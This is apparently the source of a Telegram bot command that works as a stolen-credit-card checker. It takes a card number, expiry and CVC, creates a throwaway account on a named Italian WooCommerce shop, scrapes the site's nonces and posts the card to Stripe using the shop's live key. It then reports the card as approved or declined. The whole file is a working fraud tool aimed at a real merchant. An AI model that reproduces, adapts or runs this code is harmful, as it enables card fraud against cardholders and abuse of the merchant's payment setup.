from pyrogram import Client, filters
import requests
import re
import random
import string
from colorama import Fore
from EQUROBOT import app

@app.on_message(filters.command("chk"))
def check_card(client, message):
    text = message.text.split()
    if len(text) < 2:
        message.reply_text("Please provide card details in the format: `/chk card_number|exp_month|exp_year|cvc`")
        return

    card_details = text[1]
    try:
        n, mm, yy, cvc = card_details.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
    except ValueError:
        message.reply_text("Invalid card format. Please use: card_number|exp_month|exp_year|cvc")
        return

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
    headers = {
        'user-agent': user_agent,
    }
    session = requests.Session()

    response = session.get('https://purpleprofessionalitalia.it/my-account/', headers=headers)
    register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
    if not register_nonce:
        message.reply_text("Failed to retrieve registration nonce.")
        return
    register = register_nonce.group(1)

    email = ''.join(random.choices(string.ascii_lowercase, k=20)) + '@yahoo.com'
    data = {
        'email': email,
        'password': 'ASDzxc#123#',
        'woocommerce-register-nonce': register,
        '_wp_http_referer': '/my-account/',
        'register': 'Registrati',
    }
    session.post('https://purpleprofessionalitalia.it/my-account/', headers=headers, data=data)

    response = session.get('https://purpleprofessionalitalia.it/my-account/add-payment-method/', headers=headers)
    nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]
    data = f'type=card&billing_details[name]=+&billing_details[email]={email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN'
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    if 'id' not in response.json():
        message.reply_text(Fore.RED + f"ERROR CARD: {card_details}")
        return
    stripe_id = response.json()['id']

    params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
    data = {'stripe_source_id': stripe_id, 'nonce': nonce}
    response = session.post('https://purpleprofessionalitalia.it/', params=params, headers=headers, data=data)

    if 'success' in response.text:
        response_message = (
            f"<b>APPROVED ✅\n\n"
            f"⊙ CC: <code>{card_details}</code>\n"
            f"⊙ GATES: Stripe Auth\n"
            f"⊙ STRIPE SOURCE ID: <code>{stripe_id}</code>\n"
            f"⊙ Response: Success 🟢\n\n"
            f"⊙ CHK BY: <a href='tg://user?id={message.from_user.id}'>⎯꯭⸼˹𝐌𝚁˼〄 ˹𝐃𝙰𝚇𝚇˼,</a></b>"
        )
        client.send_message(message.chat.id, response_message, parse_mode="html")
    else:
        client.send_message(message.chat.id, f"DECLINED ❌ CC: {card_details} STRIPE SOURCE ID: {stripe_id}")
